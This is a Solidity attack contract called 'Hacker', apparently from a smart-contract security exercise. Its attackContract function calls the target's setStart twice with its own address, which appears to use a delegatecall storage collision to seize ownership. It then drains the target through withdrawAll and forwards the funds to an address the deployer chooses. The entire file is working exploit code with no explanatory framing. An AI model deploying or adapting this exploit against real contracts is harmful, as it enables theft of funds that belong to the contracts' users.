//SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {IFibonacciContract} from "./IFibonacciContract.sol";

contract Hacker {
    error Hacker__NotAnOwner();
    error Hacker__NotEnoughMoney();

    IFibonacciContract private attackedContract;
    uint256 private s_ownerOfAttackedContract;
    address private s_ownerHacker;

    constructor(address _attackedContract) {
        attackedContract = IFibonacciContract(_attackedContract);
        s_ownerHacker = msg.sender;
    }

    function attackContract() external {
        attackedContract.setStart(uint256(uint160(address(this))));
        attackedContract.setStart(uint256(uint160(address(this))));
    }

    function setStartNumber(uint256 _newAOwner) external {
        s_ownerOfAttackedContract = _newAOwner;
    }

    function withdrawAllFromAttakedContract() external {
        attackedContract.withdrawAll();
    }

    modifier OnlyOwner() {
        if (msg.sender != s_ownerHacker) {
            revert Hacker__NotAnOwner();
        }
        _;
    }

    function withdraw(address to) external OnlyOwner {
        if (address(this).balance == 0) {
            revert Hacker__NotEnoughMoney();
        }
        payable(to).transfer(address(this).balance);
    }

    function getOwner() external view returns (address) {
        return s_ownerHacker;
    }

    receive() external payable {}
}
